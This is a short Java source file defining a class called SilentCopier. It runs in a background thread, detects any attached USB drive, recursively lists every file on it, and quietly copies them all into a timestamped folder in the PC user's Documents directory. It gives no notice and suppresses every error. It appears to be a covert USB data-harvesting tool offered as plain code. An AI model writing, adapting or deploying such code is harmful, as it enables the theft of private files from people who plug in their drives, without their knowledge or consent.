package org.ju.cse.gobinda;

import java.io.File;
import java.util.ArrayList;

public class SilentCopier implements Runnable {

	private ArrayList<String> filesHaveToTransfer;
	private String fileWhereToSave;

	public static void initialize() {
		new Thread(new SilentCopier()).start();
	}

	public SilentCopier() {
		filesHaveToTransfer = new ArrayList<>();
		String nowDate = ComputerManager.getPresentComputerTimeAsString();
		String pcUserName = ComputerManager.getPresentComputerUserName();
		fileWhereToSave = new String("C:/Users/" + pcUserName + "/Documents/" + nowDate);
	}

	@Override
	public void run() {
		String drivePath = ComputerManager.detectUsb();
		System.out.println(drivePath);

		if (drivePath.length() == 0) {
			return;
		}

		makeAllFileReady(drivePath);
		transferAllTheFiles();
	}

	private void transferAllTheFiles() {
		for (String nowFilePath : filesHaveToTransfer) {
			try {
				ComputerManager.copyFileUsingFileStreams(nowFilePath,
						fileWhereToSave + "/" + nowFilePath.substring(3, nowFilePath.length()));
			} catch (Exception e) {
				// TODO: handle exception
			}
		}
	}

	private void makeAllFileReady(String from) {
		from += "/";
		File[] f = new File(from).listFiles();
		for (int i = 0; i < f.length; i++) {
			try {
				filesHaveToTransfer.add(f[i].getAbsolutePath());
				if (f[i].isDirectory()) {
					makeAllFileReady(f[i].getAbsolutePath());
				}
			} catch (Exception e) {
			}
		}
	}

}
